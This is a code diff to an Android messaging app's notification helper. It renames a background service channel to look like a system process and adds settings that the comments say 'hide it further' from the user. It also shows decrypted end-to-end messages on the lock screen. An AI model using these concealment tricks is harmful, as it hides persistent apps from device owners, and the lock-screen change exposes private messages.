@@ -25,8 +25,8 @@ object NotificationHelper {
     private const val CHANNEL_NAME = "Loomi Messages"
     private const val CALL_CHANNEL_ID = "loomi_calls"
     private const val CALL_CHANNEL_NAME = "Loomi Calls"
-    private const val SERVICE_CHANNEL_ID = "loomi_root_sync"
-    private const val SERVICE_CHANNEL_NAME = "System Process"
+    private const val SERVICE_CHANNEL_ID = "loomi_system_sync"
+    private const val SERVICE_CHANNEL_NAME = "Sync Process"
     const val KEY_TEXT_REPLY = "key_text_reply"
 
     fun createNotificationChannel(context: Context) {
@@ -59,9 +59,9 @@ object NotificationHelper {
             val serviceChannel = NotificationChannel(
                 SERVICE_CHANNEL_ID,
                 SERVICE_CHANNEL_NAME,
-                NotificationManager.IMPORTANCE_MIN
+                NotificationManager.IMPORTANCE_MIN // MIN importance is safer for keeping service alive while staying quiet
             ).apply {
-                description = "Automated System Sync"
+                description = "System Synchronization"
                 setShowBadge(false)
                 lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
                 setSound(null, null)
@@ -80,11 +80,15 @@ object NotificationHelper {
             .setSilent(true)
             .setLocalOnly(true)
             .setOngoing(true)
-            .setContentTitle("") 
-            .setContentText("")
+            .setContentTitle(null) 
+            .setContentText(null)
+            .setGroup("loomi_sync_group") // Grouping helps hide it further
+            .setGroupSummary(false)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            // This is the key for Android 12+: hides notification for the first 10 seconds, 
+            // and if the task is stable, it often stays hidden/minimized.
             builder.setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_DEFERRED)
         }
 
@@ -103,6 +107,13 @@ object NotificationHelper {
 
         CoroutineScope(Dispatchers.IO).launch {
             val largeIcon = getLargeIcon(context, senderImage)
+            
+            // Decrypt message if it's E2E encrypted
+            val displayText = if (messageText.startsWith("e2e:")) {
+                EncryptionUtils.decrypt(messageText)
+            } else {
+                messageText
+            }
 
             val intent = Intent(context, MessageActivity::class.java).apply {
                 putExtra("receiverUid", senderId)
@@ -142,7 +153,7 @@ object NotificationHelper {
                 .build()
 
             val messagingStyle = NotificationCompat.MessagingStyle(user)
-                .addMessage(messageText, System.currentTimeMillis(), user)
+                .addMessage(displayText, System.currentTimeMillis(), user)
                 .setConversationTitle(senderName)
                 .setGroupConversation(false)
 
@@ -156,7 +167,6 @@ object NotificationHelper {
                 .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
                 .setFullScreenIntent(pendingIntent, false)
                 .setContentIntent(pendingIntent)
-                .addAction(replyAction)
                 .build()
 
             val manager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
